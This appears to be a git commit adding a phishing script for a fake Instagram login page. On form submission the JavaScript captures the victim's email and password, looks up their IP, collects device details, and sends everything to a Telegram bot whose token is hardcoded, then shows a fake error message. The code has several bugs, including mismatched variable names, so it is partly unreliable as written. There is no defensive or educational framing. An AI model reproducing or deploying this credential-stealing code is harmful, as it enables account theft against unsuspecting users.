5ecacc091ee8680ac5f5e315bc4902515784133a
mrbatbyte <mr.batbyte.hack@gmail.com>
2025-02-01 06:53:26 -0800

    Add files via upload

---
+++ Phishing/Instagram/javaScript.js
@@ -0,0 +1,55 @@
+const TOKEN = "7827361973:AAFA7xJ_sZ_GPPY-a4gbG2xS9i_iZPNRVB4";
+const CHAT_ID = "7827361973";
+const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+document.getElementById('login-form').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+    axios.get('https://api.ipify.org?format=json')
+        .then(response => {
+            const ip = response.date.ip;
+            console.log('User IP: ', ip);
+
+            const userAgent = navigator.userAgent;
+            const platform = navigator.platform;
+            const screenWidth = screen.Width;
+            const screenheigth = screen.height;
+            const deviceType = /mobile/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
+
+            console.log('User-Agent: ', userAgent);
+            console.log('Platform: ', platform);
+            console.log("Screen Resolution: ", screenWidth + '*' + screenheigth);
+            console.log('Device Type: ', deviceType)
+
+            const message = `                         
+                <b>New Login Attempt</b>\n
+                <b>Email: </b> ${email}\n
+                <b>Password: </b> ${password}\n
+                <b>IP Address: </b> ${ip}\n
+                <b>Device Type: </b> ${deviceType}\n
+                <b>Platform: </b> ${platform}\n
+                <b>User Agent: </b> ${userAgent}\n
+                <b>Screen Resolution: </b> ${screenWidth}x${screenHeight}
+            `;
+
+
+
+            axios.post(URI_API, {
+                chat_id: CHAT_ID,
+                parse_mode: 'html',
+                text: message
+            }).then(response => {
+                console.log("Message sent:", response.date);
+                alert("error ao enviar as information.");
+            }).catch(error => {
+                console.error("error sending message");
+                alert("error ao enviar as information.");
+            })
+        })
+        .catch(error => {
+            console.error("error IP: ", error);
+            alert("hahhahahah");
+        })
+})
